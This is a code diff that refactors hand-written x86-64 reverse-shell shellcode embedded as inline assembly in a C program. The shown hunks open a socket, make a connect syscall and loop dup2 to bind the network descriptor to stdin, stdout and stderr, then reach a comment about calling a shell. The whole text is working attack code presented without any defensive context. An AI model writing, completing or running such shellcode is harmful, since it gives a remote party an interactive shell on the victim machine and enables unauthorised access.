@@ -1,8 +1,6 @@
 #include <stdio.h>
 
-int main()
-{ 
-
+int main(){ 
 //Calling socket for FD
   // family - AF_INET (2)
   asm("xor %rdi, %rdi");
@@ -58,28 +56,33 @@ int main()
   asm("mov $42, %ax");
   asm("syscall");
 
-//Working with dup2 - to mirror descriptors
+//Working with dup2 - to mirror 3 descriptors
+                         //dup() arg1 (our network descriptor) - is still chillin' in %rdi
+  asm("xor %rsi, %rsi"); //dup() arg2 starts at 0
+  asm("xor %rbx, %rbx"); //counter
+
+
+  //Shenanigans (loop)
+  asm("call next");
+  asm("next:");      //We'll be back
+  asm("pop %rbx");
+  asm("push %rbx");
+
+  //dup2()
   asm("xor %rax, %rax");
   asm("mov $33, %ax");
 
-  //and sockfd is still set, despite "not being saved" (I'm sure its context dependant...)
-
-  // dup2(sockfd, 0); //stdin
-  asm("xor %rsi, %rsi");
+  asm("cmp $3, %rsi"); //Are we done yet?
+  asm("je cya");
+  //..no
   asm("syscall");
+  asm("add $1, %rsi");
+  asm("push %rbx");
+  asm("ret");
+  // asm("jmp %rbx");
 
-  // dup2(sockfd, 1); //stdout
-  asm("xor %rax, %rax");
-  asm("mov $33, %ax");
-  asm("add $1, %si");
-  asm("syscall");
-
-
-  // dup2(sockfd, 2); //stderr
-  asm("xor %rax, %rax");
-  asm("mov $33, %ax");
-  asm("add $1, %si");
-  asm("syscall");
+  asm("cya:");      //l8r
+  asm("pop %rax");
 //Done descriptor mirroring
 
 //Prepare to call shellz
